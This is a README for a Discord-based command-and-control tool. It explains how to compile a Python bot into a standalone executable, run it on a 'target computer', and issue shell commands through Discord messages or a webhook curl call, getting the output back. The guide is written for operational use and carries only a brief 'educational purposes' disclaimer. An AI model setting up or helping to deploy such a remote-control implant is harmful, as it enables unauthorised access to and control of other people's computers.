# Requirements
Python3

Discord

Discord BOT

Discord Webhook (optional, only if you don't want to interact directly with the server)


### Python Libs (you can install manually, or just run 'pip install -r requirements.txt')
discord.py ( ```pip install discord``` )

pyinstaller ( ```pip install pyinstaller``` )


# Guide
### Discord Bot
First, go to the discord developer application portal (https://discord.com/developers/applications) and create a new application.

In your apllication, go to "Bot" section, and click "Reset Token" button (you will use this token in the code). Select the "Message Content Intent" option.

Go to OAuth2 section, in "OAuth2 URL Generator" select "bot" option, and give the permissions "View Channels", "Send Messages", "Read Message History". Instead, if possible, you can just give the "Administrator" permission.

Copy the generated URL, paste in your browser, and add the bot to your server.

### Installation
Copy the Bot Token, and paste in the code.

Add the discord name of the users that will send the commands.

Compile to executable using pyinstaller: 
```
pyinstaller --onefile /path/to/main.py
```
The binary will be generated inside the "dist" folder. 

Now just execute the file on target computer, and send the commands on any text-channel of the discord server. 

The bot will read the message, and if the message owner is present on the list, it will execute the code and return the output.


### Webhook (Optional)

You also can use webhooks to send the commands, that way you won't interact directly with the server.

Go to Discord Server Settings > Integrations > Webhooks

Click "New Webhook", give it a name, select which channel the webhook will send the messages for you, and copy the webhook URL.

Now, you can use this command to send the commands with the webhook:
```
curl WEBHOOK_URL -H "Content-Type: application/json" --data "{\"content\": \"whoami\"}"
```

Dont forget to add the webhook in the C2_CONTROLLERS list !!!

The Webhook username probably will be WebHookName#0000



## Disclaimer: This project is for educational purposes only, I do not take responsibility for what you will do
